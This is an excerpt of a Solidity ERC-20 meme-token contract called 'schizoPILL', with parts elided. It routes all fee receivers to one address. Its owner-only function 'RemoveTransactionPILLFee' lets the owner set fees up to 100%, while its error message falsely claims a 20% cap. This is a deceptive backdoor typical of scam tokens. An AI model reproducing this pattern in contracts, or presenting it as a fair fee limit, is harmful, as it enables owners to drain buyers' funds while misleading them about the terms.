...
contract schizoPILL is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'schizomaxxing-pill';
    string private constant _symbol = 'schizoPILL';
    ...
    address internal development_receiver = 0xeDF646B301F0AaB814AF6ceDf4F7a3cbFf746BE3; 
    address internal marketing_receiver = 0xeDF646B301F0AaB814AF6ceDf4F7a3cbFf746BE3;
    address internal liquidity_receiver = 0xeDF646B301F0AaB814AF6ceDf4F7a3cbFf746BE3;
    ...
    function RemoveTransactionPILLFee(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "totalFee and sellFee cannot be more than 20%");
    }

    function RemoveTransactionPILLLimit(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
